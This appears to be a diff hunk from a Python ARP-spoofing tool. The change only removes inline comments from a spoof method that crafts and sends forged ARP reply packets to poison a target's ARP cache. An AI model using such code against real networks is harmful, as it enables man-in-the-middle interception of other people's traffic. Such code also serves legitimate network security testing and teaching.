@@ -43,10 +43,10 @@ class ARPSpoofer:
     def spoof(self, target_ip, spoof_ip, target_mac):
         """Send spoofed ARP packet"""
         packet = ARP(
-            op=2,  # ARP Reply
-            pdst=target_ip,  # Target IP
-            hwdst=target_mac,  # Target MAC
-            psrc=spoof_ip  # Spoofed Source IP
+            op=2,  
+            pdst=target_ip,  
+            hwdst=target_mac,  
+            psrc=spoof_ip  
         )
         send(packet, verbose=False)
 
